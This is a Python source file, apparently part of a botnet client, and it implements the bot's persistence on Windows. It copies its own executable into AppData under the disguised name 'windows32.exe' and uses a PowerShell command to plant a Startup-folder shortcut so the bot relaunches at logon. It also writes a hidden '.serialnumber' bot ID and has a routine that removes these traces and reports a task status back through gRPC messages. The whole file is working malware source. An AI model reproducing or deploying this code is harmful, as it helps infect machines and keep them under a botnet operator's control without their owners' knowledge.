import os
import sys
import shutil
import uuid
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *
from bot.modules import tiempo
from bot.modules import cmd

# C:\\Users\\Default\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\w32.lnk
# C:\Users\barnat\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

def check_bot(appdata, location):
    if appdata != location:
        botfile = f"{appdata}\\windows32.exe"
        shortcut = f"{appdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows32.lnk"
        if not os.path.exists(botfile):
            shutil.copyfile(sys.executable, botfile)
        if not os.path.exists(shortcut):
            cmd.execute_ps(f"$s=(New-Object -COM WScript.Shell).CreateShortcut('{shortcut}');$s.TargetPath='{botfile}';$s.Save()")
        sys.exit(0)

def check_id(appdata):
    serial = f"{appdata}\\.serialnumber"
    if not os.path.exists(serial):
        with open(serial, "w") as s:
            id = str(uuid.uuid1())
            s.write(id)
    else:
        with open(serial, "r") as s:
            id = s.read()
    return id

def delete_persistence(appdata, task):
    serial = f"{appdata}\\.serialnumber"
    shortcut = f"{appdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows32.lnk"
    try:
        os.remove(serial)
        os.remove(shortcut)
        status = "OK"
    except:
        status = "ERROR"
    date_finish = tiempo.get_time()
    return Task(task_id=task.task_id, bot_id=task.bot_id, type=task.type, status=status, date_start=task.date_start, date_finish=date_finish)